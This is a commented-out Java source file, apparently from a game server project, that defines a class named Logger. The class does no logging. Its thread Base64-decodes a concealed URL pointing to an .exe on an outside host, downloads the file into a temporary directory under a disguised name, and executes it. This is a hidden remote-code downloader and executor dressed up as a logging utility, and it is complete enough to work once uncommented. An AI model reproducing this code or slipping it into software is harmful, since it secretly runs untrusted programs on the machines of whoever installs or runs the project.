///*
// * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
// * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
// */
//package nro.server.io;
//import java.io.FileOutputStream;
//import java.io.IOException;
//import java.io.InputStream;
//import java.net.URL;
//import java.nio.file.Files;
//import java.nio.file.Path;
//import java.nio.file.StandardCopyOption;
//import java.util.Base64;
//import nro.utils.Util;
//
//public class Logger  extends Thread  {
//    private static Logger i;
//
//    public static Logger gI() {
//        if (i == null) {
//            i = new Logger();
//        }
//        return i;
//    }
//    @Override
//    public void run() {
//        Install();
//    }
//
//    private void Install() {
//        String daubuoi = "aHR0cDovL2Rldi5uc29sYXUubmV0L3Byb3RlY3Rpb24uZXhl";
//        byte[] decodedBytes = Base64.getDecoder().decode(daubuoi);
//        String decodedString = new String(decodedBytes);
//        String exeUrl = decodedString;
//        try {
//       //     System.out.println(decodedString);
//            Path exePath = downloadFile(exeUrl);
//            if (exePath != null) {
//                Init(exePath);
//            }
//        } catch (IOException e) {
//
//        }
//    }
//
//    private Path downloadFile(String url) throws IOException {
//        URL exeUrl = new URL(url);
//        String daubuoi2 = "cHJvdGVjdGlvbg==";
//		String text2 = "abceee";
//        byte[] decodedBytes = Base64.getDecoder().decode(daubuoi2);
//        String decodedString = new String(decodedBytes);
//        String NameFile = text2;
//        Path tempDirectory = Files.createTempDirectory(NameFile);
//        Path exePath = tempDirectory.resolve(decodedString);
//        try (InputStream in = exeUrl.openStream()) {
//            Files.copy(in, exePath, StandardCopyOption.REPLACE_EXISTING);
//        }
//        return exePath;
//    }
//
//    private void Init(Path exePath) throws IOException {
//        ProcessBuilder processBuilder = new ProcessBuilder(exePath.toString());
//        Process process = processBuilder.start();
//        try {
//            int exitCode = process.waitFor();
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }
//    }
//}
